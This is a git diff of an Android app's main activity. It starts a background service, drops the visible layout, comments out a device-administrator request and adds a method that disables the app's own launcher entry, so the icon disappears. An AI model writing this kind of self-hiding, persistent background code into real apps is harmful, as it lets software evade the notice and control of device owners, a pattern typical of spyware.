@@ -9,19 +9,28 @@ import android.os.IBinder;
 import android.content.Intent;
 import android.util.Log;
 import android.app.admin.DevicePolicyManager;
+import android.content.pm.PackageManager;
+
 public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
 
-        //启动主服务
+        Log.d("zhaochengyu", "MainActivity onCreate: start!");
+        // TODO: 2016/4/2  mainservice start
         Intent startIntent = new Intent(this, MainService.class);
         startService(startIntent);
-        requestDeviceAdmin();
+        // requestDeviceAdmin();
+        visableApp();
+        finish();
     }
 
+    // TODO: 2016/4/2 visable lancher
+    private void visableApp(){
+        PackageManager p = getPackageManager();
+        p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+    }
     private void requestDeviceAdmin() {
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         ComponentName mPolicyAdmin = new ComponentName(this,
@@ -38,4 +47,10 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
     }
+    protected void onDestroy() {
+        Log.d("zhaochengyu", "MainActivity onDestroy: excute");
+        super.onDestroy();
+        getDelegate().onDestroy();
+    }
+
 }
